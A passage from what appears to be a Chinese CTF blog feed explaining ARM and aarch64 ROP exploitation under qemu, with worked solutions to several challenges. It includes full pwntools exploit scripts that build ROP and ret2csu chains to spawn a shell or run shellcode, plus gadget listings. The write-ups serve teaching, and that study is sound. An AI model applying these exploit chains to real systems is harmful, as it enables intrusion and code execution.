src="https://storage.tttang.com/media/attachment/2022/08/08/52adb389-70d5-47e4-ad78-90b984509b1a.png" alt="vmxJje.png"></a></p><p><code>lwz</code>将栈上的值赋给<code>r9</code>，再用<code>mr</code>把<code>r9</code>赋给<code>r3</code>，其实就是在传递函数的返回值`n</p><p><code>addi</code>把上一个栈帧的栈顶地址存到<code>r11</code>里，然后索引到存放<code>lr</code>返回地址的位置把值放进<code>r0</code>，再通过<code>mtlr r0</code>把<code>r0</code>的值赋给<code>lr</code>寄存器，从而完成了返回地址的恢复。</p><p>接着<code>lwz r31, -4(r11)</code>即以上一个栈帧栈顶位置减4为有效地址取值存入<code>r31</code>，这一步是在恢复<code>r31</code>寄存器，对应开头进入函数时<code>stw r31, 0x60+var_4(r1)</code>在栈上保存的<code>r31</code>的值，因为它是非易失性寄存器需要恢复。</p><p>再把<code>r11</code>的值给<code>r1</code>，从而<code>r1</code>恢复指向原栈帧的栈顶，完成了函数的退栈操作。到这里也可以看出在ppc中是通过栈顶指针完成栈帧的开辟和弹出的，栈顶指针以链表形式链接，同时对局部变量的操作也是以栈顶为基址进行偏移索引的。</p><p>最后<code>blr</code>返回到原函数继续向下执行</p>]]></content>
    
    
    <summary type="html">ARM!</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="arm" scheme="https://ixout.github.io/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>异构ROP</title>
    <link href="https://ixout.github.io/posts/19037/"/>
    <id>https://ixout.github.io/posts/19037/</id>
    <published>2023-11-27T12:55:54.000Z</published>
    <updated>2023-12-26T12:30:35.087Z</updated>
    
    <content type="html"><![CDATA[<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>对于异构的rop与x86下其实并没有多大差异</p><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>在<code>CTF</code>比赛中，绝大多数异架构的题都是在<code>qemu</code>模拟出的环境中跑的</p><p>而<strong><code>qemu</code>有些不太安全的特性</strong>，比如它<strong>没有地址的随机化</strong>，<strong>也没有<code>NX</code>保护</strong>，即使题目所给的二进制文件开了<code>NX</code>和<code>PIE</code>保护，也只是对真机环境奏效，而在<code>qemu</code>中跑的时候，仍然相当于没有这些保护</p><p>也就是说，<strong><code>qemu</code>中所有地址都是有可执行权限的（包括堆栈，甚至<code>bss</code>段等）</strong>，然后<code>libc_base</code>和<code>elf_base</code>每次跑都是固定的，当然这个固定是指在同一个环境下，本地跑和远程跑的这个固定值极有可能不相同，因此有时候打远程仍需泄露<code>libc_base</code>这些信息（当然也可以选择爆破，一般和本地也就差一两位的样子）。</p><p><u>不过在比较新的版本qemu似乎支持这些保护,也就导致之前的任意shellcode失效</u></p><h1 id="arm"><a href="#arm" class="headerlink" title="arm"></a>arm</h1><h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>异构pwn主要也是rop利用,利用手法和x86并无多大差异</p><p>和x86比较不同的是函数调用的指令：</p><ul><li>x86采用call和ret完成函数调用，原理是把返回地址压栈</li><li>而arm采用b系列指令完成跳转，pop pc的方式回到父函数调用处</li><li>b系列指令中的bl指令把返回地址存到了lr寄存器中，函数返回时把原来的lr寄存器的值弄到pc里</li><li>所以其实换汤不换药，x86和arm的思路都是差不多，只不过arm多了个lr寄存器，在叶子函数里省的把返回地址压栈了</li></ul><h3 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h3><p>在<code>CTF</code>比赛中，绝大多数<code>ARM</code>架构的题都是在<code>qemu</code>模拟出的环境中跑的</p><p>而<strong><code>qemu</code>有些不太安全的特性</strong>，比如它<strong>没有地址的随机化</strong>，<strong>也没有<code>NX</code>保护</strong>，即使题目所给的二进制文件开了<code>NX</code>和<code>PIE</code>保护，也只是对真机环境奏效，而在<code>qemu</code>中跑的时候，仍然相当于没有这些保护</p><p>也就是说，<strong><code>qemu</code>中所有地址都是有可执行权限的（包括堆栈，甚至<code>bss</code>段等）</strong>，然后<code>libc_base</code>和<code>elf_base</code>每次跑都是固定的，当然这个固定是指在同一个环境下，本地跑和远程跑的这个固定值极有可能不相同，因此有时候打远程仍需泄露<code>libc_base</code>这些信息（当然也可以选择爆破，一般和本地也就差一两位的样子）。</p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj - typo"></a><strong>jarvisoj - typo</strong></h3><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/桌面/pwn$ checksec typo</span><br><span class="line">[*] &#x27;/home/aichch/pwn/typo&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8000)</span><br><span class="line">aichch@sword-shield:~/桌面/pwn$ file ./typo </span><br><span class="line">./typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped</span><br></pre></td></tr></table></figure><p>未开启canary和pie</p><p>又因为是静态链接,所以完全可以在程序中寻找system(‘/bin/sh’)</p><p>程序去除了符号表,要想读明白伪代码并不容易</p><p>对于复杂一些的题目,可能需要利用bindiff之类的工具来恢复符号表</p><p><code>qemu-arm-statically -g 1234 ./typo</code>启动程序</p><p>在按下回车键后,程序会读入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Let&#x27;s Do Some Typing Exercise~</span><br><span class="line">Press Enter to get start;</span><br><span class="line">Input ~ if you want to quit</span><br><span class="line"></span><br><span class="line">------Begin------</span><br><span class="line">sulphur</span><br></pre></td></tr></table></figure><p>猜测有溢出,用pwntools验证</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.binary=<span class="string">&#x27;./typo&#x27;</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm-static&#x27;</span>,<span class="string">&#x27;-g&#x27;</span>,<span class="string">&#x27;1235&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">p.sendline()</span><br><span class="line">p.send(cyclic(<span class="number">200</span>))</span><br></pre></td></tr></table></figure><p>程序果然崩溃,并得出偏移112</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Invalid address 0x62616164</span><br><span class="line"></span><br><span class="line"> ► f 0 0x62616164</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; cyclic -l 0x62616164</span><br><span class="line">Finding cyclic pattern of 4 bytes: b&#x27;daab&#x27; (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br><span class="line">pwndbg&gt; </span><br></pre></td></tr></table></figure><p>之后就是构造rop,首先要找到system和/bin/sh字符串</p><p>/bin/sh字符串好找,但system函数因为去除符号表就有些难找了,不过我们能够利用/bin/sh字符串是被system调用的,来找到system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0006C384 2F                            unk_6C384 DCB 0x2F ; /                  ; DATA XREF: sub_10BA8+468↑o</span><br><span class="line">.rodata:0006C384                                                                       ; .text:off_110AC↑o</span><br><span class="line">.rodata:0006C385 62 69 6E 2F 73 68 00          aBinSh DCB &quot;bin/sh&quot;,0</span><br></pre></td></tr></table></figure><p>有时可能不会显示这个,应该是程序还没加载完,等待一会并重新进入刷新就会有了</p><p>得到system函数地址10ba8</p><p>接下来就是找gadget了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">ropper -f ./typo --search &#x27;pop&#x27; --quality 1</span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: pop</span><br><span class="line"></span><br><span class="line">[INFO] File: ./typo</span><br><span class="line">0x00008d1c: pop &#123;fp, pc&#125;; </span><br><span class="line">0x0001dba4: pop &#123;lr&#125;; bx r3; </span><br><span class="line">0x00008420: pop &#123;pc&#125;; </span><br><span class="line">0x00053078: pop &#123;r0, r1, r2, r3, r4, lr&#125;; bx ip; </span><br><span class="line">0x00020904: pop &#123;r0, r4, pc&#125;; </span><br><span class="line">0x00068bec: pop &#123;r1, pc&#125;; </span><br><span class="line">0x00068bd8: pop &#123;r2, r3&#125;; bx lr; </span><br><span class="line">0x00053d10: pop &#123;r3, lr&#125;; bx r3; </span><br><span class="line">0x00008160: pop &#123;r3, pc&#125;; </span><br><span class="line">0x0000ab0c: pop &#123;r3, r4, r5, pc&#125;; </span><br><span class="line">0x0000a958: pop &#123;r3, r4, r5, r6, r7, pc&#125;; </span><br><span class="line">0x00008a3c: pop &#123;r3, r4, r5, r6, r7, r8, fp, pc&#125;; </span><br><span class="line">0x0000a678: pop &#123;r3, r4, r5, r6, r7, r8, sb, pc&#125;; </span><br><span class="line">0x00008520: pop &#123;r3, r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; </span><br><span class="line">0x00019664: pop &#123;r3, r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; blx r3; </span><br><span class="line">0x00068c68: pop &#123;r3, r4, r5, r6, r7, r8, sl, pc&#125;; </span><br><span class="line">0x00014a70: pop &#123;r3, r4, r7, pc&#125;; </span><br><span class="line">0x00008de8: pop &#123;r4, fp, pc&#125;; </span><br><span class="line">0x00053004: pop &#123;r4, lr&#125;; bx r3; </span><br><span class="line">0x000083b0: pop &#123;r4, pc&#125;; </span><br><span class="line">0x00008eec: pop &#123;r4, r5, fp, pc&#125;; </span><br><span class="line">0x00009284: pop &#123;r4, r5, pc&#125;; </span><br><span class="line">0x000242e0: pop &#123;r4, r5, r6, fp, pc&#125;; </span><br><span class="line">0x000095b8: pop &#123;r4, r5, r6, pc&#125;; </span><br><span class="line">0x000212ec: pop &#123;r4, r5, r6, r7, fp, pc&#125;; </span><br><span class="line">0x000082e8: pop &#123;r4, r5, r6, r7, pc&#125;; </span><br><span class="line">0x00043110: pop &#123;r4, r5, r6, r7, r8, fp, pc&#125;; </span><br><span class="line">0x0001d4e0: pop &#123;r4, r5, r6, r7, r8, lr&#125;; bx r3; </span><br><span class="line">0x00011648: pop &#123;r4, r5, r6, r7, r8, pc&#125;; </span><br><span class="line">0x00048e9c: pop &#123;r4, r5, r6, r7, r8, sb, fp, pc&#125;; </span><br><span class="line">0x000502e4: pop &#123;r4, r5, r6, r7, r8, sb, lr&#125;; bx ip; </span><br><span class="line">0x0000a5a0: pop &#123;r4, r5, r6, r7, r8, sb, pc&#125;; </span><br><span class="line">0x0001ddfc: pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, lr&#125;; bx r3; </span><br><span class="line">0x00033164: pop &#123;r4, r5, r6, r7, r8, sb, sl, fp, pc&#125;; </span><br><span class="line">0x0005db14: pop &#123;r4, r5, r6, r7, r8, sb, sl, lr&#125;; bx r3; </span><br><span class="line">0x00011c24: pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;; </span><br><span class="line">0x000553cc: pop &#123;r4, r5, r6, r7, r8, sl, pc&#125;; </span><br><span class="line">0x00055424: pop &#123;r4, r5, r6, r7&#125;; bx lr; </span><br><span class="line">0x00023ed4: pop &#123;r4, r5, r7, pc&#125;; </span><br><span class="line">0x00068728: pop &#123;r4, r5&#125;; bx lr; </span><br><span class="line">0x00023dbc: pop &#123;r4, r7, pc&#125;; </span><br><span class="line">0x00014068: pop &#123;r7, pc&#125;; </span><br><span class="line">0x00048300: pop &#123;r7&#125;; bx lr; </span><br><span class="line">0x00008c58: popeq &#123;r3, pc&#125;; blx r2; </span><br><span class="line">0x00008c18: popeq &#123;r3, pc&#125;; blx r3; </span><br></pre></td></tr></table></figure><p>我们选择这一条<code>0x00020904: pop &#123;r0, r4, pc&#125;;</code></p><p>于是<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process([<span class="string">&#x27;qemu-arm-static&#x27;</span>,<span class="string">&#x27;./typo&#x27;</span>])</span><br><span class="line">p.sendline()</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">pop_r0_r4_pc_addr=<span class="number">0x00020904</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0006c384</span></span><br><span class="line">sys_addr=<span class="number">0x00010BA8</span></span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(pop_r0_r4_pc_addr)+p32(bin_sh_addr)+p32(<span class="number">0</span>)+p32(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()     </span><br></pre></td></tr></table></figure><h3 id="2018-上海市大学生网络安全大赛-baby-arm"><a href="#2018-上海市大学生网络安全大赛-baby-arm" class="headerlink" title="2018 上海市大学生网络安全大赛 - baby_arm"></a>2018 上海市大学生网络安全大赛 - baby_arm</h3><p>首先看一下,文件相关信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arm: ELF 64-bit LSB executable, ARM aarch64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, for GNU/Linux 3.7.0, BuildID[sha1]=e988eaee79fd41139699d813eac0c375dbddba43, stripped</span><br><span class="line">[*] &#x27;/home/aichch/pwn/arm&#x27;</span><br><span class="line">    Arch:     aarch64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>动态链接,没开pie和canary</p><p>ida静态分析一下</p><p>程序很简单,首先是向bss段读取0x200的字符,然后再向栈中变量读入0x200字符,显然存在栈溢出</p><p>不过可以发现,第二个read也并不能修改当前函数的返回地址,因为它的读入地址要比返回地址更高</p><p>发现程序中有调用 <code>mprotect</code> 的代码段</p><p>因此可以有如下思路：</p><ol><li>第一次输入 name 时，在 bss 段写上 shellcode</li><li>通过 rop 调用 mprotect 改变 bss 的权限</li><li>返回到 bss 上的 shellcode</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary=<span class="string">&#x27;./arm&#x27;</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/aarch64-linux-gnu&#x27;</span>, <span class="string">&#x27;./arm&#x27;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;./arm&#x27;</span>)</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=offset*<span class="string">b&#x27;a&#x27;</span>+p64(csu1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(csu2) <span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(mprotect_got)+p64(<span class="number">7</span>)<span class="comment">#x21 x22  分别赋值给了x3 x2</span></span><br><span class="line">payload2+=p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)<span class="comment">#x23 x24  分别赋值给了x1 w0</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(bss_addr)<span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x21 x22</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x23 x24</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>以上是常规做法</p><p>但如果能够确定程序是在qemu中运行的,那么程序就没有nx保护,任意地址可执行</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.binary=<span class="string">&#x27;baby_arm&#x27;</span></span><br><span class="line">p=process([<span class="string">&#x27;qemu-aarch64&#x27;</span>, <span class="string">&#x27;-L&#x27;</span>, <span class="string">&#x27;/usr/aarch64-linux-gnu&#x27;</span>, <span class="string">&#x27;baby_arm&#x27;</span>])</span><br><span class="line">e=ELF(<span class="string">&#x27;baby_arm&#x27;</span>)</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line"></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload2=offset*<span class="string">b&#x27;a&#x27;</span>+p64(bss_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>通常，在调用了 libc.so 的程序中，都会用到 __libc_csu_init() 这个函数来对libc进行初始化</p><p>在init中可以找到它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004008AC</span><br><span class="line">.text:00000000004008AC                               loc_4008AC                              ; CODE XREF: init+60↓j</span><br><span class="line">.text:00000000004008AC A3 7A 73 F8                   LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">.text:00000000004008B0 E2 03 16 AA                   MOV             X2, X22</span><br><span class="line">.text:00000000004008B4 E1 03 17 AA                   MOV             X1, X23</span><br><span class="line">.text:00000000004008B8 E0 03 18 2A                   MOV             W0, W24</span><br><span class="line">.text:00000000004008BC 73 06 00 91                   ADD             X19, X19, #1</span><br><span class="line">.text:00000000004008C0 60 00 3F D6                   BLR             X3</span><br><span class="line">.text:00000000004008C0</span><br><span class="line">.text:00000000004008C4 7F 02 14 EB                   CMP             X19, X20</span><br><span class="line">.text:00000000004008C8 21 FF FF 54                   B.NE            loc_4008AC</span><br><span class="line">.text:00000000004008C8</span><br><span class="line">.text:00000000004008CC</span><br><span class="line">.text:00000000004008CC                               loc_4008CC                              ; CODE XREF: init+3C↑j</span><br><span class="line">.text:00000000004008CC F3 53 41 A9                   LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">.text:00000000004008D0 F5 5B 42 A9                   LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">.text:00000000004008D4 F7 63 43 A9                   LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">.text:00000000004008D8 FD 7B C4 A8                   LDP             X29, X30, [SP+var_s0],#0x40</span><br><span class="line">.text:00000000004008DC C0 03 5F D6                   RET</span><br></pre></td></tr></table></figure><p>先分析下面的loc_4008cc的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">LDP             X29, X30, [SP+var_s0],#0x40                </span><br><span class="line">RET</span><br></pre></td></tr></table></figure><p>第一句这个LDP X19, X20, [SP,#var_s10]就是说将SP+0x10所指向的内容给x19和x20寄存器（x19寄存器拿的是SP+0x10所指向的内容，而x20寄存器拿的是SP+0x18所指向的内容）</p><p>然后第四句这个LDP X29, X30, [SP+var_s0],#0x40的意思是将SP所指向的内容给x29和x30寄存器（x29寄存器拿的是SP所指向的内容，而x30寄存器拿的是SP+0x8所指向的内容），完成这句指令之后，再将SP指针增加0x40个字节。</p><p>然后ret，这个就是返回到x30寄存器所存储的值。</p><p>再结合着刚刚分析的内容，来看一下loc_4008ac的内容。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure><p>第一句就是说将x19的值逻辑左移3位，然后加上x21的值，将得到的这个值所指向内容给x3寄存器。（如果我们控制x19的值为0的话，就是说把x21寄存器的值所指向的内容给x3寄存器。</p><p>然后剩下的mov，add就没什么好说的了。</p><p>倒数第三行BLR指令是去跳转到X3寄存器的值，同时把下一个指令的地址存到x30里面。</p><p>然后下面的CMP和x86里面的一样了。</p><p>如此思路就出来了，几乎是跟ret2csu的利用方法一样。有两点需要注意一下。</p><p>第一点就是loc_4008cc中的</p><p>LDP X29, X30, [SP+var_s0],#0x40 这个指令，虽然<strong>它是在这个loc_4008cc函数的最后，但是它传给x29和x30寄存器的时候，拿的是栈顶的值。因此布置栈中数据的时候，栈顶的内容应该是存放的x29和x30的值。</strong></p><p>第二点，<strong>是BLR X3的时候，这个X3的值溯源一下，它是由X21充当指针来指向的，而X21的值又是SP+0x20充当指针来指向的。意思就是说，最终跳转的目标是x21指向的指针</strong></p><h3 id="inctf2018-wARMup"><a href="#inctf2018-wARMup" class="headerlink" title="inctf2018_wARMup"></a>inctf2018_wARMup</h3><p>文件信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">aichch@sword-shield:~/桌面/pwn$ checksec ./wARMup</span><br><span class="line">[*] &#x27;/home/aichch/pwn/wARMup&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">aichch@sword-shield:~/桌面/pwn$ file ./wARMup </span><br><span class="line">./wARMup: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux-armhf.so.3, for GNU/Linux 3.2.0, BuildID[sha1]=fbe5794e95d6ea5006ea3137c0120ed945acae17, not stripped</span><br></pre></td></tr></table></figure><p>32位动态链接</p><p>这题主要就是利用由qemu运行的arm程序,尽管程序开启了nx</p><p>但实际运行时依然是任意地址可执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [sp+4h] [bp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf((FILE *)_bss_start, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to bi0s CTF!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x78</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read调用时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:00010530 78 20 A0 E3                   MOV     R2, #0x78 ; &#x27;x&#x27;                 ; nbytes</span><br><span class="line">.text:00010534 03 10 A0 E1                   MOV     R1, R3                          ; buf</span><br><span class="line">.text:00010538 00 00 A0 E3                   MOV     R0, #0                          ; fd</span><br><span class="line">.text:0001053C 8E FF FF EB                   